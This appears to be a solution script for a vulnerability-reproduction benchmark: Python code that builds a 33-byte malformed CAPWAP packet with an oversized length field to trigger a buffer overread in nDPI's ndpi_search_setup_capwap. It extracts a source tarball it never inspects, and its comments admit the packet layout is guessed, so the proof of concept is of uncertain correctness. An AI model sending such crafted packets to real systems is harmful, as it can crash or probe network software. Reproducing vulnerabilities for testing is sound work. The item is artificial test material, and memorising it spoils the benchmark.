import os
import tarfile
import tempfile
import subprocess
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # First, extract and examine the source code to understand the vulnerability
        with tempfile.TemporaryDirectory() as tmpdir:
            # Extract the source tarball
            with tarfile.open(src_path, 'r:*') as tar:
                tar.extractall(tmpdir)
            
            # Look for the vulnerable function and understand the vulnerability
            # Based on the description: buffer overread in ndpi_search_setup_capwap
            # We need to create a CAPWAP packet that triggers the overflow
            
            # CAPWAP header structure (simplified):
            # - First byte: version (4 bits) and reserved (4 bits)
            # - Second byte: message type and flags
            # - Next 2 bytes: length
            # - Next 4 bytes: ID
            # - Next 8 bytes: various fields
            
            # Create a malformed CAPWAP packet that will cause buffer overread
            # The exact exploit depends on the specific vulnerability, but
            # we can craft a packet with incorrect length fields
            
            # Build a PoC that's exactly 33 bytes (ground-truth length)
            # Format: CAPWAP header with malicious length field
            
            # CAPWAP header (first 16 bytes)
            # version = 0, message type = discovery request (1)
            header = bytearray(33)
            
            # Set version and message type
            header[0] = 0x01  # Version 0, message type 1
            
            # Set flags - all zeros for simplicity
            header[1] = 0x00
            
            # Set length field to a value that causes overflow
            # For buffer overread, we need length > actual packet size
            # Let's set it to a large value (exceeds 33 bytes)
            length = 0x0100  # 256 bytes - much larger than our 33 byte packet
            header[2:4] = struct.pack('>H', length)
            
            # Set ID
            header[4:8] = b'\x00\x00\x00\x01'
            
            # Set fragment ID and offset
            header[8:12] = b'\x00\x00\x00\x00'
            
            # Remaining bytes can be arbitrary
            # Fill with pattern to help detect overflow
            for i in range(16, 33):
                header[i] = 0x41 + (i % 26)  # A-Z pattern
            
            return bytes(header)
